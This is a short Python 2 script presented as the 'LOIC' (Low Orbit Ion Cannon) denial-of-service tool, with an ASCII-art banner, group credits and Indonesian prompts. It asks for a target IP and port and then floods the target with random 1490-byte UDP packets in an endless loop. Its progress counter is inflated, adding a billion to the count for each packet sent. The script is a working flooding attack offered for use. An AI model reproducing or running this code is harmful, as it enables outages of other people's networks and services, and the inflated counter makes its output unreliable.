




import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet LOIC")
print
print """\033[31;1m
         `/ymMMMMMMMMMMMMMMmy/`
       /hMMMMMMMMMMMMMMMMMMMMMMh/
     /mMMmNMMMMMNNNNNNNNMMMMMNNMMm/
   `hNmo:dMMNNNmNNmNNmNNmNNNMMd:omNh`
  .mh:+/hMNNNNmNNmNdhmmNNmNNNNMy/o:hm.
 `d+://sNmMMMmMMMmdy+/mMMMmMMMmNs///+d`
 ys.o/oMmNNNmNNMNNMmdMNNMNNmNNNmMo/o.ys
`my.-/NmMMMMmMMNmNNyyNNmNMMmMMMMmN/:`ym`
-h/+s/MmMMMNmNNNdym++mymNNNmNMMNmM:so/h-
-N.o.sMmMMMNh/:-`-Mo\033[37;1msM-`-:/hNMMMmMs.+.N-
`ho/-ohmMMMM/    -M/+M.    /MMMMmho-/oh
 s+-s-odmNNN`     /-:/     .NNNmd+:s-+s
 `mo/-:+ymMm                mMms+:-/om`
  .h/+/y`hhs                yyh`y/+/h.
   `hd/::-+.                .+-::/dy`
     /hs+/::.--          --.::/+sh:
       :hds+/-`          `-/+sdh:
         `/ymM+          oMmy/"""
         
  
print "\033[32;1m<=======================================>"         
print "\033[34;1m||========>LON ORBIT LOW CANON<=========||"
print "\033[32;1m<=======================================>"
print "CREATED=MR.SPOON"
print "thanks to=PUTRA-KING-SAHRUL-HIDDEN-MR.GENDER-FIREWOFL-LIONCYBER-ALL MEMBER BPC"
print
ip = raw_input("MASUKAN IP TAGET ===> ")
port = input("Port       ===> ")

os.system("clear")
os.system("figlet Loading..")
print "membutuhkan waktu 10 detik"
time.sleep(10)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1000000000
     port = port + 0
     print "\033[32;1mMengirim %s packet ke %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 0
